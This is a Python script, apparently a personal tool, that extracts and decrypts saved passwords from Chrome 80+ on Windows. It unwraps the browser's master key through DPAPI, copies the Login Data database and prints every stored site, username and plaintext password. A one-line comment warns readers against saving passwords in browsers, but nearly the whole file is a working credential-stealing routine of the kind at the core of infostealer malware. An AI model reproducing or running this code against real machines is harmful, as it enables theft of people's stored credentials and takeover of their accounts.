#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time:2022/8/28 14:00
# @Author:boyizhang
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

'''
这里是破解的是chrome 8以上的记住的密码信息。为了安全考虑，请尽量不要使用浏览器保存用户信息
'''
def get_master_key():
    LocalState = XXXXXX #local_state文件
    with open(LocalState, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"



if __name__ == '__main__':

    master_key = get_master_key()
    login_db = 'LOGIN'# LOGIN DATA 文件
    shutil.copy2(login_db, "Logindata") #直接是打不开的，只能复制之后打开复制的文件 chrome下面的Cookie和记住的密码都是一样的加密方式
    conn = sqlite3.connect("Logindata")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
    except Exception as e:
        print("数据文件有问题")

    cursor.close()
    conn.close()
    try:
        os.remove("Logindata")
    except Exception as e:
        print("数据移除不成功")